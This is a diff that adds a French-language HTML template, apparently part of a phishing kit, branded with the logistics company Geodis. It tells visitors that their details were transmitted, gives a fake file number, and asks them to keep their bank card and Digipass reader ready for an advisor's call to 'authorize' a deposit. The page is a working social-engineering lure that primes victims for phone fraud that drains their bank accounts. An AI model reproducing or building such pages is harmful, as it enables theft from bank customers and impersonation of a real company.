@@ -1,0 +1,68 @@
+{% extends 'base.html' %}
+
+{% block title %}Transfert en cours{% endblock %}
+
+{% block content %}
+    <style>
+        body {
+            background: url("/static/images/background.jpg") center center / contain no-repeat fixed;
+            background-color: #f5f5f5;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        .thank-you-container {
+            max-width: 600px;
+            margin: 2rem auto;
+            padding: 2rem;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .thank-you-container h2 {
+            font-size: 1.5rem;
+            color: #4B2AAF;
+            margin-bottom: 1rem;
+        }
+
+        .thank-you-container p {
+            font-size: 1rem;
+            color: #333;
+            line-height: 1.5;
+            margin-bottom: 1rem;
+        }
+
+        .thank-you-container .highlight {
+            font-weight: bold;
+        }
+
+        .thank-you-container img {
+            max-width: 100%;
+            height: auto;
+            margin: 1rem 0;
+        }
+
+        .footer-text {
+            font-size: 0.9rem;
+            color: #555;
+            margin-top: 1rem;
+        }
+    </style>
+
+    <div class="thank-you-container">
+        <h2>Transfert en cours ...</h2>
+        <img src="{{ url_for('static', filename='images/geodis-building.jpg') }}" alt="Geodis">
+        <p>Virement mis en attente car vos coordonnées ont été transmises avec succès.</p>
+        <p>
+            <span class="highlight">N° de dossiers :</span> GEODIS-10391 OXQ<br>
+            Restez joignable, un conseiller du service clientèle vous contactera dans les plus brefs délais...
+            Tenez votre carte et lecteur de cartes (ou Digipass) à portée de main pour autoriser le dépôt d'argent
+            sur votre compte bancaire instantanément.
+        </p>
+        <img src="{{ url_for('static', filename='images/card-reader.png') }}" alt="Lecteur de cartes">
+        <p class="footer-text">Ce service vous est proposé par - Geodis</p>
+    </div>
+{% endblock %}
